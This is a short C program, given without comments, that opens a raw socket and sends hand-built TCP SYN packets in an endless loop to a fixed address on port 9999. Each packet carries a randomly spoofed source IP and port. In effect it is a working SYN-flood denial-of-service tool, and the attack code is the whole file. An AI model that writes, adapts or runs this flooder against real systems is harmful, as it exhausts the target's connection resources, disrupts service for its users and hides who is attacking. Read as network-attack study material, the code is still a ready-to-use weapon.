#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define DESTIP "192.168.3.24"

typedef struct pseudo_hdr
{
    uint32_t src;
    uint32_t dst;
    uint8_t zero;
    uint8_t protocol;
    uint16_t len;
}__attribute__((packed)) pse_hdr_t;

typedef struct send_syn
{
    struct iphdr i_hdr;
    struct tcphdr t_hdr;
}__attribute__((packed)) syn_raw_t;

typedef struct 
{
    pse_hdr_t p_hdr;
    struct tcphdr t_hdr;
}__attribute__((packed)) csum_t;

unsigned short csum(char *buf, int size)
{
    unsigned short *base = (unsigned short *)buf;
    unsigned long sum = 0;

    while (size > 1)
    {
        sum += *(base++);
        if (sum >> 16)
            sum = (sum >> 16) + (sum & 0xffff);
        size -= 2;
    }

    if (1 == size)
        sum += *((unsigned char *)base);
    while (sum >> 16)
        sum = (sum >> 16) + (sum & 0xffff);

    return ~sum;
}

void cal_tcp_checksum(syn_raw_t *hdr)
{
    char *base = (char *)hdr;
    struct iphdr *i_hdr = &(hdr->i_hdr);
    struct tcphdr *t_hdr = &(hdr->t_hdr);

    csum_t c_buf;

    c_buf.p_hdr.src = i_hdr->saddr;
    c_buf.p_hdr.dst = i_hdr->daddr;
    c_buf.p_hdr.zero = 0;
    c_buf.p_hdr.protocol = i_hdr->protocol;
    c_buf.p_hdr.len = sizeof(struct tcphdr);

    memcpy((char *)(&c_buf) + sizeof(pse_hdr_t), base + sizeof(struct iphdr), sizeof(csum_t) - sizeof(pse_hdr_t));

    t_hdr->check = csum((char *)(&c_buf), sizeof(csum_t));
    printf("tcp check = %#x\n", t_hdr->check);
}

void build_ip_header(syn_raw_t *hdr)
{
    struct iphdr *p_hdr = &(hdr->i_hdr);

    p_hdr->version = 4;
    p_hdr->ihl = 5;
    p_hdr->tos = 0;
    p_hdr->tot_len = htons(sizeof(syn_raw_t));
    p_hdr->id = htons(100);
    p_hdr->frag_off = htons(0);
    p_hdr->ttl = 64;
    p_hdr->protocol = IPPROTO_TCP;
    p_hdr->check = 0;
    p_hdr->saddr = (uint32_t)(rand());
    p_hdr->daddr = inet_addr(DESTIP);

    p_hdr->check = csum((char *)p_hdr, sizeof(struct iphdr));
    printf("ip check = %#x\n", p_hdr->check);
}

void build_tcp_header(syn_raw_t *hdr)
{
    struct tcphdr *p_hdr = &(hdr->t_hdr);

    p_hdr->source = htons((uint16_t)(rand()));
    p_hdr->dest = htons(9999);
    p_hdr->seq = htonl(rand());
    p_hdr->ack_seq = htonl(0);
    p_hdr->res1 = 0;
    p_hdr->doff = 5;
    p_hdr->fin = 0;
    p_hdr->syn = 1;
    p_hdr->rst = 0;
    p_hdr->psh = 0;
    p_hdr->ack = 0;
    p_hdr->urg = 0;
    p_hdr->res2 = 0;
    p_hdr->window = htons(6000);
    p_hdr->check = htons(0);
    p_hdr->urg_ptr = htons(0);

    cal_tcp_checksum(hdr);
}

int main(void)
{
    int sd, ret;
    struct sockaddr_in dst;
    socklen_t len;
    syn_raw_t packet;
    int opt;

    len = sizeof(dst);
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    inet_pton(AF_INET, DESTIP, &dst.sin_addr);

    sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd == -1)
    {
        perror("socket");
        exit(1);
    }

    opt = 1;
    ret = setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
    if (ret == -1)
    {
        perror("setsockopt");
        exit(1);
    }

    while (1)
    {
        build_ip_header(&packet);
        build_tcp_header(&packet);
        ret = sendto(sd, &packet, sizeof(packet), 0, (struct sockaddr *)&dst, len);

        if (-1 == ret)
        {
            perror("sendto");
            exit(1);
        }
    }
    close(sd);
    exit(0);
}
